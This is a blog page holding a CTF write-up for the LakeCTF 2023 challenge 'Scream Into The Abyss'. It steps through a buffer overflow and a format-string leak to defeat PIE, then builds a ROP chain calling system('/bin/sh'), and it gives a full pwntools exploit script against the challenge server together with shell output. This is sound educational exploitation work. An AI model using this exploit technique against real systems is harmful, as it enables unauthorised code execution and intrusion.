@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.7.0.802638266418">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 3.7.0">
+
+    <!-- Primary Meta Tags -->
+    <title>LakeCTF 2023 - Scream Into The Abyss</title>
+    <meta name="title" content="LakeCTF 2023 - Scream Into The Abyss">
+    <meta name="description" content="We are given the following files:">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://bytebl33d.github.io/writeups/ctf/lake-ctf-scream-into-the-abyss/">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://bytebl33d.github.io/writeups/ctf/lake-ctf-scream-into-the-abyss/">
+    <meta property="og:title" content="LakeCTF 2023 - Scream Into The Abyss">
+    <meta property="og:description" content="We are given the following files:">
+    <meta property="og:image" content="https://bytebl33d.github.io/assets/images/headers/lake-ctf.png">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://bytebl33d.github.io/writeups/ctf/lake-ctf-scream-into-the-abyss/">
+    <meta property="twitter:title" content="LakeCTF 2023 - Scream Into The Abyss">
+    <meta property="twitter:description" content="We are given the following files:">
+    <meta property="twitter:image" content="https://bytebl33d.github.io/assets/images/headers/lake-ctf.png">
+
+    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+
+    <link href="../../../resources/css/retype.css?v=3.7.0.802638266418" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../../resources/js/config.js?v=3.7.0.802638266418" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../resources/js/retype.js?v=3.7.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../resources/js/lunr.js?v=3.7.0.802638266418" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../resources/js/prism.js?v=3.7.0.802638266418" defer></script>
+</head>
+<body>
+    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
+        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    
+        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="docs-sidebar-toggle"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="docs-site-logo" href="../../../" class="flex items-center leading-snug text-2xl">
+                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">bytebl33d</span>
+                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">Blog</span>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="../../../blog/">Posts</a>
+                            </li>
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/bytebl33d">GitHub</a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                        </div>
+        
+                        <!-- Mobile search button -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placeholder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="docs-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+        <div class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                </div>
+            
+                <div class="pl-6 mt-1 mb-4">
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                </div>
+            
+                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
+                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                        <span class="text-xs whitespace-nowrap">Powered by</span>
+                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                    </a>
+                </div>
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+            
+                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                            <nav>
+                                <ul class="flex flex-wrap justify-center items-center">
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="../../../blog/">Posts</a>
+                                    </li>
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/bytebl33d">GitHub</a>
+                                    </li>
+            
+                                </ul>
+                            </nav>
+                        </div>
+            
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                            <span class="text-xs whitespace-nowrap">Powered by</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                        </a>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 dark:bg-dark-850">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div class="min-w-0 p-4 grow md:px-16">
+                        <main class="relative pb-12 lg:pt-2">
+                            <div class="docs-markdown" id="docs-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="docs-sidebar-right-toggle"></div>
+                                <!-- Page content  -->
+<doc-anchor-target id="lakectf-2023---scream-into-the-abyss" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#lakectf-2023---scream-into-the-abyss">#</doc-anchor-trigger>
+        <span>LakeCTF 2023 - Scream Into The Abyss</span>
+    </h1>
+</doc-anchor-target>
+<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center">
+    <div>In&nbsp;</div>
+    <div><a href="../../../categories/ctf/">CTF</a>,&nbsp;</div>
+    <div><a href="../../../categories/binary-exploitation/">Binary-Exploitation</a></div>
+    <div class="mx-2">&#9679;</div>
+    <div class="flex items-center shrink-0">Published&nbsp;<span>2023-11-06</span></div>
+</div>
+
+<p><figure class="content-center">
+    <img src="../../../assets/images/headers/lake-ctf.png" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="challenge" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#challenge">#</doc-anchor-trigger>
+        <span>Challenge</span>
+    </h1>
+</doc-anchor-target>
+<p>We are given the following files:</p>
+<ul>
+<li>nc chall.polygl0ts.ch 9001</li>
+<li>abyss_scream</li>
+<li>Dockerfile</li>
+</ul>
+<p>Lets see what we are dealing with and list the protections that are enabled:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ checksec abyss_scream
+[*] '../LakeCTF/pwn_abyss/abyss_scream'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled</code></pre>
+</doc-codeblock></div>
+<p>Source code of <code v-pre>main</code> and <code v-pre>save_msg</code> functions.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">void main(void)
+{
+   int iVar1;
+   uint local_c;
+   
+   local_c = 0;
+   printf(&quot;Scream into the abyss and see how long it takes for you to get a response ;)&quot;);
+   do {
+      while( true ) {
+          printf(&quot;Current iteration: %d\n&quot;,(ulong)local_c);
+          printf(&quot;Enter input: &quot;);
+          fflush(stdout);
+          iVar1 = getchar();
+          getchar();
+          if ((char)iVar1 != 'x') break;
+          save_msg(local_c);
+          local_c = 0;
+      }
+      local_c = local_c + 1;
+   } while( true );
+}
+
+void save_msg(uint param_1)
+{
+   char local_118 [264];
+   char *local_10;
+   
+   local_10 = (char *)calloc(8,1);
+   printf(&quot;You can now scream a longer message but before you do so, we\'ll take your name: &quot;);
+   fflush(stdout);
+   gets(local_10);
+   printf(&quot;Saved score of %d for %s. Date and Time: &quot;,(ulong)param_1,local_10);
+   fflush(stdout);
+   system(&quot;date&quot;);
+   printf(&quot;Now please add a message: &quot;);
+   fflush(stdout);
+   gets(local_118);        # vulnerable to buffer overflow
+   puts(&quot;Your message:&quot;);
+   printf(local_118);      # format string vulnerability
+   puts(&quot;&quot;);
+   fflush(stdout);
+   return;
+}</code></pre>
+</doc-codeblock></div>
+<p>When we run the program and enter <code v-pre>x</code>, we get into the <code v-pre>save_msg</code> function that contains both a buffer overflow and format string vulnerability that we can exploit to execute <code v-pre>system(&quot;/bin/sh&quot;)</code> and read the flag on the file system.</p>
+<doc-anchor-target id="finding-the-offset">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#finding-the-offset">#</doc-anchor-trigger>
+        <span>Finding the Offset</span>
+    </h2>
+</doc-anchor-target>
+<p>We can create a cyclic pattern and calculate the offset to our return address. Lets open GDB and enter our payload after it asks us to input our message.
+Because the binary does a call to <code v-pre>system(date)</code>, we can&#x27;t debug after this call and have to jump past it. First we disassemble the <code v-pre>save_msg</code> function to find where we can set a breakpoint.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">pwndbg&gt; disass save_msg
+...
+0x000000000000128f &lt;+134&gt;:	call   0x1110 &lt;fflush@plt&gt;
+0x0000000000001294 &lt;+139&gt;:	lea    rax,[rip+0xdef]        # 0x208a
+0x000000000000129b &lt;+146&gt;:	mov    rdi,rax
+0x000000000000129e &lt;+149&gt;:	call   0x10c0 &lt;system@plt&gt;
+0x00000000000012a3 &lt;+154&gt;:	lea    rax,[rip+0xde5]        # 0x208f
+0x00000000000012aa &lt;+161&gt;:	mov    rdi,rax
+0x00000000000012ad &lt;+164&gt;:	mov    eax,0x0
+0x00000000000012b2 &lt;+169&gt;:	call   0x10d0 &lt;printf@plt&gt;
+...</code></pre>
+</doc-codeblock></div>
+<p>We will set a breakpoint right before the system call and then jump to <code v-pre>save_msg+154</code>:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">pwndbg&gt; b *save_msg+146
+pwndbg&gt; b *save_msg+219
+pwndbg&gt; r
+pwndbg&gt; jump *save_msg+154
+
+Continuing at 0x5555555552a3.
+Saved score of 0 for x. Date and Time: Now please add a message: </code></pre>
+</doc-codeblock></div>
+<p>Now we can enter our cyclic pattern in the prompt and inpect the <code v-pre>RSP</code> to calculate our offset:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">*RBP  0x6361617463616173 ('saactaac')
+*RSP  0x7fffffffdf08 ◂— 'uaacvaacwaacxaacyaac'
+*RIP  0x55555555531d (save_msg+276) ◂— ret 
+
+$ python3 -c 'from pwn import *;print(cyclic_find(&quot;uaac&quot;))'
+280</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="testing-our-offset">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#testing-our-offset">#</doc-anchor-trigger>
+        <span>Testing our offset</span>
+    </h3>
+</doc-anchor-target>
+<p>Next we can confirm that this is the right offset by creating a small python script that puts <code v-pre>0xdeadbeef</code> at our found offset.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">from pwn import *
+
+exe = './abyss_scream'
+elf = context.binary = ELF(exe, checksec=False)
+context.log_level = 'debug'
+
+p = process(exe)
+
+p.sendlineafter(b'Enter input: ', 'x')
+p.sendlineafter(b'name: ', 'x')
+
+payload = flat({
+  padding: [
+    0xdeadbeef
+  ]
+})
+
+p.sendlineafter(b'message: ', payload)</code></pre>
+</doc-codeblock></div>
+<p>Demonstrating that it works:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ python3 exploit.py
+$ sudo dmesg | tail -n 2
+[ 1202.784357] abyss_scream[6648]: segfault at deadbeef ip 00000000deadbeef sp 00007ffefe45a900 error 14
+[ 1202.784384] Code: Unable to access opcode bytes at 0xdeadbec5.</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="leaking-addresses">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#leaking-addresses">#</doc-anchor-trigger>
+        <span>Leaking Addresses</span>
+    </h2>
+</doc-anchor-target>
+<p>Because of the format string vulnerability we can leak addresses of the stack. Lets create a small fuzzing script that will loop through several leaked addresses to see if we find interesting addresses.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">from pwn import *
+
+exe = './abyss_scream'
+elf = context.binary = ELF(exe, checksec=False)
+context.log_level = 'warning'
+
+def send_payload(payload, name):
+   p.recvuntil(b&quot;input: &quot;)
+   p.sendline(b&quot;x&quot;)
+   p.recvuntil(b&quot;name: &quot;)
+   p.sendline(name)
+   p.recvuntil(b&quot;message: &quot;)
+   p.sendline(payload)
+
+data = b&quot;&quot;
+i = 0
+name_str = &quot;bytebl33d&quot;
+for i in range(50):
+   try:
+      p = start()
+      send_payload(f&quot;%{i}$p&quot;.encode(), name=name_str)
+      p.recvuntil(b&quot;Your message:\n&quot;)
+      data = p.recvuntil(b&quot;\n&quot;)
+      print(i, data)
+      p.recvuntil(b&quot;input: &quot;)
+      p.close()
+   except EOFError:
+      pass</code></pre>
+</doc-codeblock></div>
+<p>We try looking for addresses starting with <code v-pre>0x55</code>, and we find a few that might be useful:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">4 b'0x56168b3e66b5\n'
+...
+37 b'0x55cdf5071d90\n'
+...
+41 b'0x561bf357a6c0\n'
+...
+43 b'0x55e4378d139e\n'</code></pre>
+</doc-codeblock></div>
+<p>We inspect them in gdb one by one and come to the following conclusions:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session"># 41th address points to the beginning of our name input
+pwndbg&gt; x/s 0x561bf357a6c0
+0x561bf357a6c0:	&quot;bytebl33d&quot;
+
+# 43th address points to main+128
+pwndbg&gt; x 0x55e4378d139e
+0x55e4378d139e &lt;main+128&gt;:	0x00fc45c7</code></pre>
+</doc-codeblock></div>
+<p>Based on this information we can calculate the address of <code v-pre>main</code> and the address of our input buffer. The latter can be used to store our string to <code v-pre>/bin/sh\x00</code>. We add the following to our exploit script:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">def get_leak_address(index):
+    send_payload(&quot;%{}$p&quot;.format(index))
+    p.recvuntil(b&quot;Your message:\n&quot;)
+    data = p.recvuntil(b&quot;\n&quot;)
+    return int(data, 16)
+
+print(&quot;main (symbols) @&quot;, context.binary.symbols[&quot;main&quot;])
+main_addr = get_leak_address(43) - 128
+info(f'main_addr @ {hex(main_addr)}')
+
+piebase = main_addr - context.binary.symbols[&quot;main&quot;]
+info(f'PIE base @ {hex(piebase)}')</code></pre>
+</doc-codeblock></div>
+<p>With this code we can calculate the pie base address:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ python3 exploit.py 
+main (symbols) @ 4894
+[*] main_addr @ 0x55870bfb131e
+[*] PIE base @ 0x55870bfb0000</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="finding-useful-instructions">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#finding-useful-instructions">#</doc-anchor-trigger>
+        <span>Finding useful instructions</span>
+    </h3>
+</doc-anchor-target>
+<p>We will need a <code v-pre>pop rdi</code> and <code v-pre>ret</code> gadget that we can find in gdb or with ropper. The reason fo the <code v-pre>ret</code> gadget is that when we perform our buffer overflow, we have to realign the stack before continuing our chain. When <code v-pre>ret</code> is invoked, it increments <code v-pre>$rsp</code> by 8. Thus, you can simply add a dummy ret to make <code v-pre>$rsp</code> 16-byte aligned.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ ropper --file abyss_scream --search &quot;pop rdi&quot;
+[INFO] File: abyss_scream
+0x00000000000013b5: pop rdi; ret; 
+
+$ ropper --file abyss_scream --search &quot;ret&quot;
+[INFO] File: abyss_scream
+0x000000000000101a: ret;</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="rop-chain">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#rop-chain">#</doc-anchor-trigger>
+        <span>ROP Chain</span>
+    </h2>
+</doc-anchor-target>
+<p>We can now use both gadgets to set the first argument of the system function with the address of <code v-pre>/bin/sh</code>, and then call the <code v-pre>system</code> function.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python"># pop_rdi gadget
+pop_rdi = elf.address + 0x13b5
+info(f'pop_rdi @ {hex(pop_rdi)}')
+
+# ret gadget
+ret = elf.address + 0x101a
+info(f'ret @ {hex(ret)}')
+
+# system call address
+system = elf.plt.system
+info(f'system @ {hex(system)}')
+
+# leak binsh address 
+bin_sh = get_leak_address(41)
+print(&quot;/bin/sh @&quot;, hex(bin_sh))
+
+payload = flat({
+   padding: [
+      ret,
+      pop_rdi,
+      bin_sh,
+      system
+   ]
+})</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="final-exploit">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#final-exploit">#</doc-anchor-trigger>
+        <span>Final Exploit</span>
+    </h2>
+</doc-anchor-target>
+<p>Here is the final exploit script that executes our ROP chain with all the required addresses.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">from pwn import *
+
+exe = './abyss_scream'
+elf = context.binary = ELF(exe, checksec=False)
+
+p = remote(&quot;chall.polygl0ts.ch&quot;, 9001)
+
+padding = 280
+
+def send_payload(payload, name=b&quot;bytebl33d&quot;):
+  p.recvuntil(b&quot;input: &quot;)
+  p.sendline(b&quot;x&quot;)
+  p.recvuntil(b&quot;name: &quot;)
+  p.sendline(name)
+  p.recvuntil(b&quot;message: &quot;)
+  p.sendline(payload)
+
+def get_leak_address(index, name=b&quot;/bin/sh\x00&quot;):
+   send_payload(&quot;%{}$p&quot;.format(index), name)
+   p.recvuntil(b&quot;Your message:\n&quot;)
+   data = p.recvuntil(b&quot;\n&quot;)
+   return int(data, 16)
+
+print(&quot;main (symbols) @&quot;, context.binary.symbols[&quot;main&quot;])
+main_addr = get_leak_address(43) - 128
+info(f'main_addr @ {hex(main_addr)}')
+
+elf.address = main_addr - context.binary.symbols[&quot;main&quot;]
+info(f'PIE base @ {hex(elf.address)}')
+
+# pop_rdi gadget
+pop_rdi = elf.address + 0x13b5
+info(f'pop_rdi @ {hex(pop_rdi)}')
+
+# ret gadget
+ret = elf.address + 0x101a
+info(f'ret @ {hex(ret)}')
+
+# system call address
+system = elf.plt.system
+info(f'system @ {hex(system)}')
+
+# binsh address 
+bin_sh = get_leak_address(41)
+print(&quot;/bin/sh @&quot;, hex(bin_sh))
+
+payload = flat({
+   padding: [
+      ret,
+      pop_rdi,
+      bin_sh,
+      system
+   ]
+})
+
+send_payload(payload)
+
+p.interactive()
+p.close()</code></pre>
+</doc-codeblock></div>
+<p>And when executing the script we get a shell:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ python3 exploit.py
+[+] Opening connection to chall.polygl0ts.ch on port 9001: Done
+main (symbols) @ 4894
+[*] main_addr @ 0x55d92859331e
+[*] PIE base @ 0x55d928592000
+[*] pop_rdi @ 0x55d9285933b5
+[*] system @ 0x55d9285930c4
+[*] ret @ 0x55d92859301a
+/bin/sh @ 0x55d9291e06f0
+[*] Switching to interactive mode
+Your message:
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaac\x1a0Y(\xd9U
+$ id
+uid=1000(jail) gid=1000(jail) groups=1000(jail)
+$ ls
+flag.txt
+run
+$ cat flag.txt
